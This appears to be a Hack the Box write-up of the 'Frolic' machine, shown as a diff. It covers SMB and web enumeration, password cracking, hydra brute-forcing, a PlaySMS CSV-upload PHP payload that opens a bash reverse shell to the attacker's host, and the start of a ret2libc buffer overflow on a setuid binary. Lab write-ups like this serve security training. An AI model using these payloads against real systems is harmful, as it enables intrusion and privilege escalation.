@@ -1,0 +1,880 @@
+Frolic - Hack the Box - Easy Linux Samba to Web Services
+
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $smbmap -H 10.10.10.111
+[+] Guest session   	IP: 10.10.10.111:445	Name: 10.10.10.111                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	IPC$                                              	NO ACCESS	IPC Service (frolic server (Samba, Ubuntu))
+=====================================================================================================================================
+
+We go to the web page and find some interesting text.
+
+Commands and Output:
+=====================================================================================================================================
+Thank you for using nginx. http://forlic.htb:1880
+=====================================================================================================================================
+
+From the output we get a subdomain and port we can possibly connect to. We use netcat to establish a connection on the port to figure
+out if it is open. 
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $nc -zv 10.10.10.111 1880
+10.10.10.111: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.10.10.111] 1880 (?) open
+=====================================================================================================================================
+
+The "-z" flag in netcat just connects and imddiately shuts off comms.
+
+We go to our web browser and get a node red instance with a login username and password field.
+
+We have two different websites and two different hosts or subdomains.
+
+We edit out hosts names file so that it includes both frolic and forlic.htb names.
+
+We attempt mulliple login names and pass using burp and come to find that we are blocked after too many attempt with the following 
+message
+Commands and Output:
+=====================================================================================================================================
+{"error":"server_error","error_description":"Too many login attempts. Wait 10 minutes and try again"}
+=====================================================================================================================================
+
+We will avoid going through this web page until we find actual creds because of the bruteforce detection.
+We can test for virtual host routing which may bring us to a different page.
+
+We go to: http://10.10.10.111:9999/test/
+We go to: http://10.10.10.111:9999/admin/
+
+In test there is a php info text we can analyze:
+Commands and Output:
+=====================================================================================================================================
+# Mean we can't exploit LFI's, no remote file inclusion, include statements in php can't be to remote servers.
+allow_url_include	Off	Off
+
+# We go to: view-source:http://10.10.10.111:9999/backup/
+password.txt
+user.txt
+loop/
+=====================================================================================================================================
+
+If we go to each of those pages using the web browser we find interesting bits.
+Commands and Output:
+=====================================================================================================================================
+password - imnothuman
+
+user - admin
+=====================================================================================================================================
+
+username: admin password: imnothuman
+
+GOing to /loop gets us a forbiden.
+
+What will do is run a gobuster for each of the directories gobuster has found so far
+Commands and Output:
+=====================================================================================================================================
+/admin                (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/]
+/test                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/test/] 
+/dev                  (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/]  
+/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/]
+/loop                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/loop/]
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+for i in loop backup dev test admin
+do 
+  gobuster dir -u http://10.10.10.111:9999/$i -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-$i.log -t 50
+done
+=====================================================================================================================================
+
+After we create the script to keep enumerating the web pages we go back and attempt to login to the admin page that we found however
+using the creds we found results in a login failure only allowing us 2 more password attempts. 
+
+Interestingly no requests are being made to the server if we observe through burp, so we go back and analyze the source code and look
+at the javascript put in place and notice:
+view-source:http://10.10.10.111:9999/admin/js/login.js
+Commands and Output:
+=====================================================================================================================================
+var attempt = 3; // Variable to count number of attempts.
+// Below function Executes on click of login button.
+function validate(){
+var username = document.getElementById("username").value;
+var password = document.getElementById("password").value;
+if ( username == "admin" && password == "superduperlooperpassword_lol"){
+alert ("Login successfully");
+window.location = "success.html"; // Redirecting to other page.
+return false;
+}
+else{
+attempt --;// Decrementing by one.
+alert("You have left "+attempt+" attempt;");
+// Disabling fields after 3 attempts.
+if( attempt == 0){
+document.getElementById("username").disabled = true;
+document.getElementById("password").disabled = true;
+document.getElementById("submit").disabled = true;
+return false;
+}
+}
+}
+=====================================================================================================================================
+
+That the actual creds are in the js source code and all we need to do is use the creds stored in the js file.
+We get a success on the html page
+http://10.10.10.111:9999/admin/success.html
+
+However we get the follwoing weird encoding
+Commands and Output:
+=====================================================================================================================================
+..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.
+=====================================================================================================================================
+We copy and paste the text on google and see if we get any hits, we don't but apparently if we google that it is aprogramming language 
+that is a joke esoteric pl. We can decode base off of this in the follwoing website:
+https://www.dcode.fr/ook-language
+
+And reading from the console and we get:
+Nothing here check /asdiSIAJJ0QWE9JAS
+
+So we go to the weblinks and we get the following
+http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/
+Commands and Output:
+=====================================================================================================================================
+UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA
+=====================================================================================================================================
+
+Which all looks like base64 we can decode this with base64 -d on the commandline
+Base64 uses "=" for padding if it is not divisible by 4. Also removing the spaces from the document could help with the decoding.
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $sed -i 's/ //g' random-page.64 
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $cat random-page.64 
+UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $base64 -d random-page.64 
+PK     É7M#�[�i	index.phpUT	�|�[�|�[ux
+                                          ^D�J�s�h�)�P�n
+                                                        ��Ss�Jw�܎�4��ُk�z��UȖ�+X��P��ᶇ��л�x_�N�[���S��8����J2S�*�DЍ}�8dTQk������j_�����'xc��ݏt��75Q�
+         ���k,4��b)�4F��	��������&q2o�WԜ�9P#�[�iPK      É7M#�[�i	��index.phpUT�|�[ux
+                                                                                           PKO┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $vim random-page.64 
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $base64 -d random-page.64 
+PK     É7M#�[�i	index.phpUT	�|�[�|�[ux
+                                          ^D�J�s�h�)�P�n
+                                                        ��Ss�Jw�܎�4��ُk�z��UȖ�+X��P��ᶇ��л�x_�N�[���S��8����J2S�*�DЍ}�8dTQk������j_�����'xc��ݏt��75Q�
+         ���k,4��b)�4F��	��������&q2o�WԜ�9P#�[�iPK      É7M#�[�i	��index.phpUT�|�[ux
+                                                                                           PKO┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $base64 -d random-page.64 > random-page
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $file !$
+file random-page
+random-page: Zip archive data, at least v2.0 to extract
+=====================================================================================================================================
+
+We ran a file command and see that the decoded string referes to a zip arcive.
+
+Commands and Output:
+=====================================================================================================================================
+└──╼ $zipinfo random-page.zip 
+Archive:  random-page.zip
+Zip file size: 360 bytes, number of entries: 1
+-rw-r--r--  3.0 unx      617 TX defN 18-Sep-23 04:44 index.php
+1 file, 617 bytes uncompressed, 164 bytes compressed:  73.4%
+
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $unzip random-page.zip 
+Archive:  random-page.zip
+[random-page.zip] index.php password: 
+password incorrect--reenter:
+=====================================================================================================================================
+
+We are queried for password. So the next thing to do is use zip2john to convert the file into a hash we can attempt to crack.
+
+NOTE: use ATL+"." to cycle through previous arguments on command line.
+
+We run john and find the password being paswword
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $sudo !!
+sudo john --wordlist=/opt/SecLists/rockyou.txt random-page.zip.hash 
+[sudo] password for user: 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password         (random-page.zip/index.php)
+1g 0:00:00:00 DONE (2021-05-07 13:08) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..total90
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+=====================================================================================================================================
+
+After we unzip the file we get more encoded shit.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic/base64-stuff/rand]
+└──╼ $unzip random-page.zip 
+Archive:  random-page.zip
+[random-page.zip] index.php password: 
+  inflating: index.php               
+┌─[user@parrot-virtual]─[~/htb/frolic/base64-stuff/rand]
+└──╼ $ls
+index.php  random-page.zip
+┌─[user@parrot-virtual]─[~/htb/frolic/base64-stuff/rand]
+└──╼ $cat index.php 
+4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
+=====================================================================================================================================
+
+This looks very much like hex so we can decode it using xxd.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic/base64-stuff/rand]
+└──╼ $cat index.php | xxd -r -p
+KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
+KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
+K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
+┌─[user@parrot-virtual]─[~/htb/frolic/base64-stuff/rand]
+└──╼ $cat index.php | xxd -r -p | base64 -d
++++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+base64: invalid input
+=====================================================================================================================================
+
+Looks like it is similar to the previous encoded strings so we can search it vi google:
+https://www.dcode.fr/brainfuck-language
+
+We place in the text in the decoded and get the following string:
+dcode
+
+Going back we realize that the string was not all in oneline so we make sure there are no newlines.
+
+And we get the folllowing:
+idkwhatispass
+
+We will assume that is password for something and add it to our passwordlist.
+
+We now go back and take a look at our gobuster results.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic/gobuster]
+└──╼ $cat *
+/css                  (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/css/]
+/js                   (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/js/]
+/loop                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/loop/]
+/test                 (Status: 200) [Size: 5]
+/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/backup/]
+/loop                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/loop/loop/]
+=====================================================================================================================================
+
+If we go to http://10.10.10.111:9999/dev/backup/
+we find another directory:
+/playsms
+
+Which when used on the webpage:
+http://10.10.10.111/playsms
+
+We get redirected to the following login page:
+http://10.10.10.111:9999/playsms/index.php?app=main&inc=core_auth&route=login
+
+We also check test but its just a test file.
+
+Next we can also use hydra to smb with the possible creds we have obtained.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $hydra -l admin -P password.txt smb://10.10.10.111
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-07 13:30:53
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 2 login tries (l:1/p:2), ~2 tries per task
+[DATA] attacking smb://10.10.10.111:445/
+[445][smb] Host: 10.10.10.111 Account: admin Error: Invalid account (Anonymous success)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-07 13:30:54
+=====================================================================================================================================
+
+No successful login. So we move on to the newly found webpage and try to login and we do. Using the admin and idkpassword creds.
+We ca do a quick searcshploit on playsms and we find a few exploits.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $searchsploit playsms
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)                      | php/remote/44598.rb
+PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit)                      | php/remote/48335.rb
+PlaySms 0.7 - SQL Injection                                                                             | linux/remote/404.pl
+PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                          | php/webapps/26871.txt
+PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                   | php/webapps/7687.txt
+PlaySms 0.9.5.2 - Remote File Inclusion                                                                 | php/webapps/17792.txt
+PlaySms 0.9.9.2 - Cross-Site Request Forgery                                                            | php/webapps/30177.txt
+PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload                      | php/webapps/42003.txt
+PlaySMS 1.4 - 'import.php' Remote Code Execution                                                        | php/webapps/42044.txt
+PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)                  | php/remote/44599.rb
+PlaySMS 1.4 - Remote Code Execution                                                                     | php/webapps/42038.txt
+PlaySMS 1.4.3 - Template Injection / Remote Code Execution                                              | php/webapps/48199.txt
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+=====================================================================================================================================
+
+We look a the first exploit and come to find that the website is vulnerable and we can upload php code that can be executed.
+The include is most likley adding php and accepting it.
+http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_sendfromfile&op=list
+
+We can try and upload a test file to see what it needs for the exploit to work.
+Commands and Output:
+=====================================================================================================================================
+Send from file
+
+Confirmation
+
+Uploaded file: test
+
+
+Found invalid entries in uploaded file (invalid entries: 1 of 1)
+
+Invalid entries
+Destination number 	Message 	Username
+=====================================================================================================================================
+
+We get an invalid entry and we most likely need 3 different params as outlined.
+
+We create a file with fields 1,2,3
+
+we get the following output
+Commands and Output:
+=====================================================================================================================================
+Send from file
+
+Confirmation
+
+Uploaded file: upload
+
+Found valid entries in uploaded file (valid entries: 1 of 1)
+
+Your choice
+=====================================================================================================================================
+
+We can try putting php code in one of the fields and test how it works.
+We upload the following to one of the files and see that we get code execution.
+Commands and Output:
+=====================================================================================================================================
+<?php system('whoami'); ?>,2,3
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+Send from file
+
+Confirmation
+
+Uploaded file: catch
+
+
+Found invalid entries in uploaded file (invalid entries: 1 of 1)
+
+Invalid entries
+Destination number 	Message 	Username
+www-data 	2 	admin
+=====================================================================================================================================
+
+So we edit the payload to instead send back a reverse shell and listening on port 9001 with netcat.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $cat catch 
+<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/9001 0>&1'"); ?>,2,3
+=====================================================================================================================================
+
+We then upload and get a connection back with netcat.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic]
+└──╼ $nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.10.10.111] 39104
+bash: cannot set terminal process group (1213): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@frolic:~/html/playsms$ whoami
+whoami
+www-data
+=====================================================================================================================================
+
+Next thing to do is run a vulnerability checker script such as linenum or linpeas on the box.
+We find an interesting root owened file in ayushes directory.
+/home/ayush/.binary/rop
+
+If we look at it more we notice it has the setuid bit set and owned by root.
+Commands and Output:
+=====================================================================================================================================
+www-data@frolic:/home/ayush/.binary$ ls -la
+total 16
+drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .
+drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 ..
+-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop
+www-data@frolic:/home/ayush/.binary$ file rop
+rop: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped
+=====================================================================================================================================
+
+
+We will see what running the executable tells us 
+Commands and Output:
+=====================================================================================================================================
+www-data@frolic:/home/ayush/.binary$ ./rop
+[*] Usage: program <message>
+=====================================================================================================================================
+
+We will further analyze the file by transferring it to our box.
+
+Commands and Output:
+=====================================================================================================================================
+www-data@frolic:/home/ayush/.binary$ base64 rop
+f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIMECDQAAABgGAAAAAAAADQAIAAJACgAHwAcAAYAAAA0
+AAAANIAECDSABAggAQAAIAEAAAUAAAAEAAAAAwAAAFQBAABUgQQIVIEECBMAAAATAAAABAAAAAEA
+AAABAAAAAAAAAACABAgAgAQIGAcAABgHAAAFAAAAABAAAAEAAAAIDwAACJ8ECAifBAggAQAAJAEA
+AAYAAAAAEAAAAgAAABQPAAAUnwQIFJ8ECOgAAADoAAAABgAAAAQAAAAEAAAAaAEAAGiBBAhogQQI
+RAAAAEQAAAAEAAAABAAAAFDldGT
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/frolic/www]
+└──╼ $base64 -d rop.64 > rop
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic/www]
+└──╼ $gdb rop
+GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
+Copyright (C) 2021 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+GEF for linux ready, type `gef' to start, `gef config' to configure
+89 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
+[*] 3 commands could not be loaded, run `gef missing` to know why.
+Reading symbols from rop...
+(No debugging symbols found in rop)
+gef➤  r hello
+Starting program: /home/user/htb/frolic/www/rop hello
+[+] Message sent: hello[Inferior 1 (process 112200) exited normally]
+=====================================================================================================================================
+
+First thing to do when abusing a buffer overflow is generate the buffer overflow string.
+Commands and Output:
+=====================================================================================================================================
+gef➤  pattern create 100
+[+] Generating a pattern of 100 bytes
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+[+] Saved as '$_gef0'
+=====================================================================================================================================
+
+Running the program with the buffer
+Commands and Output:
+=====================================================================================================================================
+gef➤  r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+Starting program: /home/user/htb/frolic/www/rop aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+...
+..
+..
+..
+[ Legend: Modified register | Code | Heap | Stack | String ]
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x64      
+$ebx   : 0xffffd0b0  →  0x00000002
+$ecx   : 0x0       
+$edx   : 0x0       
+$esp   : 0xffffd080  →  "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
+$ebp   : 0x6161616d ("maaa"?)
+$esi   : 0xf7fa7000  →  0x001e4d6c
+$edi   : 0xf7fa7000  →  0x001e4d6c
+$eip   : 0x6161616e ("naaa"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd080│+0x0000: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"	 ← $esp
+0xffffd084│+0x0004: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
+0xffffd088│+0x0008: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
+0xffffd08c│+0x000c: "raaasaaataaauaaavaaawaaaxaaayaaa"
+0xffffd090│+0x0010: "saaataaauaaavaaawaaaxaaayaaa"
+0xffffd094│+0x0014: "taaauaaavaaawaaaxaaayaaa"
+0xffffd098│+0x0018: "uaaavaaawaaaxaaayaaa"
+0xffffd09c│+0x001c: "vaaawaaaxaaayaaa"
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x6161616e
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "rop", stopped 0x6161616e in ?? (), reason: SIGSEGV
+
+=====================================================================================================================================
+
+
+Commands and Output:
+=====================================================================================================================================
+gef➤  pattern offset 0x6161616e
+[+] Searching '0x6161616e'
+[+] Found at offset 52 (little-endian search) likely
+[+] Found at offset 49 (big-endian search)
+=====================================================================================================================================
+
+We can also verify as a sanithy check by plugging in the following
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/frolic/www]
+└──╼ $python -c 'print("A"*52)'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+..
+..
+..
+gef➤  r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd3adc0de
+Starting program: /home/user/htb/frolic/www/rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd3adc0de
+
+Program received signal SIGSEGV, Segmentation fault.
+0x64613364 in ?? ()
+..
+..
+..
+$esp   : 0xffffd0b0  →  "c0de"
+$ebp   : 0x41414141 ("AAAA"?)
+$esi   : 0xf7fa7000  →  0x001e4d6c
+$edi   : 0xf7fa7000  →  0x001e4d6c
+$eip   : 0x64613364 ("d3ad"?)
+..
+..
+..
+Cannot disassemble from $PC
+[!] Cannot access memory at address 0x64613364
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "rop", stopped 0x64613364 in ?? (), reason: SIGSEGV
+
+
+=====================================================================================================================================
+
+We will need to do return oriented programming to be able to successfully root the box.
+We check the security of the binary and figure what kind of attack we can implement.
+Commands and Output:
+=====================================================================================================================================
+gef➤  checksec
+[+] checksec for '/home/user/htb/frolic/www/rop'
+Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : Partial
+
+=====================================================================================================================================
+
+DEP is enabled, which is read only mode. On the foreign machine we also have to check if aslr is enabled or not
+Commands and Output:
+=====================================================================================================================================
+www-data@frolic:/home/ayush/.binary$ cat /proc/sys/kernel/randomize_va_space 
+0
+www-data@frolic:/home/ayush/.binary$ uname -a
+Linux frolic 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:22:43 UTC 2018 i686 athlon i686 GNU/Linux
+=====================================================================================================================================
+
+It is not. Since this will be a simple rop we want to get the libc address.
+
+Commands and Output:
+=====================================================================================================================================
+www-data@frolic:/home/ayush/.binary$ ldd rop
+	linux-gate.so.1 =>  (0xb7fda000)
+	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
+	/lib/ld-linux.so.2 (0xb7fdb000)
+=====================================================================================================================================
+
+We need location of system and exit. 
+Commands and Output:
+=====================================================================================================================================
+www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i system
+   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
+   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+..
+..
+..
+www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i exit
+   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
+   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
+   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
+   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
+   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
+   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
+  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
+  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
+  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
+  1849: 000b07c8    24 FUNC    WEAK   DEFAULT   13 _Exit@@GLIBC_2.1.1
